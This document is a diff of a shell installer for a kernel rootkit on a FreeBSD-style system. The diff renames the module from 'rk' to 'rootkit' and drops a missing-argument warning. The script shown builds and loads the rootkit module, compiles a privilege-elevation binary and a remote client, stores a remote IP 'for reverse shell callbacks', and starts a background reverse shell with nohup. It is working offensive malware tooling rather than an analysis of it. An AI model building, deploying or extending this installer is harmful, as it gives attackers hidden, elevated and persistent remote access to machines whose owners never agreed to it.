@@ -3,13 +3,10 @@
 set -eu
 
 REMOTE_IP="${1:-}"
-if [ -z "$REMOTE_IP" ]; then
-    printf '[!] Note: No REMOTE_IP argument provided\n' >&2
-fi
 
 PROJECT_DIR=$(CDPATH= cd -P "$(dirname "$0")" && pwd)
 MODULE_DIR="$PROJECT_DIR/kernel"
-MODULE_FILE="$MODULE_DIR/rk.ko"
+MODULE_FILE="$MODULE_DIR/rootkit.ko"
 USERSPACE_DIR="$PROJECT_DIR/user"
 ELEVATE_SRC="$USERSPACE_DIR/elevate.c"
 ELEVATE_BIN="$USERSPACE_DIR/elevate"
@@ -28,15 +25,15 @@ fail() {
 [ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"
 
 # Store REMOTE IP for reverse shell callbacks
-echo "$REMOTE_IP" > /etc/rk_remote_ip
+echo "$REMOTE_IP" > /etc/rootkit_remote_ip
 
 # Check dependencies
 for command in make kldload kldstat cc install; do
     command -v "$command" >/dev/null 2>&1 || fail "Required command not found: $command"
 done
 
-# Build rk.ko
-printf '%s\n' '[*] Building rk.ko...'
+# Build rootkit.ko
+printf '%s\n' '[*] Building rootkit.ko...'
 make -C "$MODULE_DIR"
 [ -f "$MODULE_FILE" ] || fail "build could not create $MODULE_FILE"
 
@@ -53,16 +50,16 @@ printf '%s\n' '[*] Building remote client binary...'
 cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC" || fail "Failed to build remote client binary"
 chmod 755 "$REMOTE_BIN"
 
-# Load rk.ko
-if kldstat -q -m rk >/dev/null 2>&1; then
-    printf '%s\n' '[*] rk.ko is already loaded'
+# Load rootkit.ko
+if kldstat -q -m rootkit >/dev/null 2>&1; then
+    printf '%s\n' '[*] rootkit.ko is already loaded'
 else
-    printf '%s\n' '[*] Loading rk.ko...'
+    printf '%s\n' '[*] Loading rootkit.ko...'
     kldload "$MODULE_FILE"
 fi
 
-# Check if rk.ko is loaded
-kldstat -q -m rk >/dev/null 2>&1 || fail "rk.ko was not found in the kernel module list after loading"
+# Check if rootkit.ko is loaded
+kldstat -q -m rootkit >/dev/null 2>&1 || fail "rootkit.ko was not found in the kernel module list after loading"
 
 # Verify elevate was built successfully
 [ -f "$ELEVATE_BIN" ] || fail "Build did not create $ELEVATE_BIN"
@@ -80,5 +77,5 @@ nohup /usr/local/bin/revshell >/dev/null 2>&1 &
 
 # Print completion message
 printf '%s\n' '[+] Installation complete; module entry:'
-kldstat -m rk
-printf '%s\n' '[*] Unload with: kldunload rk'
+kldstat -m rootkit
+printf '%s\n' '[*] Unload with: kldunload rootkit'
